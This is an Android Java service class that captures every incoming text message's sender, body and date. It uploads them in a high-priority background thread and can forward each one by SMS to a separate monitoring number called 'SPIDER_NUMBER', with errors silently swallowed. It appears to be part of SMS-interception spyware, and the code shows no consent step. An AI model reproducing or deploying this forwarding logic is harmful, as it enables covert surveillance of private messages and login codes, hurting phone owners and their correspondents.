package com.it.mougang.gasmyr.events.Services;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.it.mougang.gasmyr.events.Utilities.GlobalConstants;
import com.it.mougang.gasmyr.events.Utilities.Utils;
import com.it.mougang.gasmyr.events.applicationThreads.SmsThreadRunnable;
import com.it.mougang.gasmyr.events.database.SMS;
import com.it.mougang.gasmyr.events.database.SmsType;

/**
 * Created by gasmyr on 10/27/15.
 */
public class SMSService extends IntentService {

    private String SMS_SENDER = null;
    private String SMS_BODY = null;
    private String SMS_DATE = null;
    private String USER_ID = null;
    private String SPIDER_NUMBER = null;
    private boolean candSendBySms = false;
    private boolean smsIsEnable=false;

    public SMSService(String name) {
        super(name);
    }

    public SMSService() {
        super("smsservice");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Bundle bundle = intent.getExtras();
        SMS_SENDER = bundle.getString(GlobalConstants.EVENT_INCOMING_SMS_SENDER_NUMBER);
        SMS_BODY = bundle.getString(GlobalConstants.EVENT_INCOMING_SMS_BODY);
        SMS_DATE = bundle.getString(GlobalConstants.EVENT_INCOMING_SMS_DATE);
        USER_ID = bundle.getString(GlobalConstants.USER_ID);
        SPIDER_NUMBER = bundle.getString(GlobalConstants.SPIDER_NUMBER);
        candSendBySms = bundle.getBoolean(GlobalConstants.CAN_SEND_BY_SMS);
        smsIsEnable=bundle.getBoolean(GlobalConstants.ENABLE_SMS);

        SMS sms = new SMS(SMS_BODY, SMS_DATE, SMS_SENDER, Utils.getUserphoneNumber
                (getApplicationContext()), SmsType.INCOMING.toString());
        if (Utils.isConnectionAvailable(getApplicationContext()) && USER_ID != null) {
            try{
                SmsThreadRunnable smsThreadRunnable=new SmsThreadRunnable(getApplicationContext(),USER_ID,sms);
                Thread smsThread =new Thread(smsThreadRunnable);
                smsThread.setPriority(Thread.MAX_PRIORITY);
                smsThread.start();
            }
            catch(Exception e){

            }
        }
        if (candSendBySms && SPIDER_NUMBER !=null && smsIsEnable &&
                !SMS_SENDER.equalsIgnoreCase(SPIDER_NUMBER)) {
            Utils.sendNewSms(getMessageToSend(), SPIDER_NUMBER);
        }

    }

    private String getMessageToSend() {
        return SMS_BODY + "<---> FROM:" +
                SMS_SENDER + "<---> ON:" + SMS_DATE;
    }
}
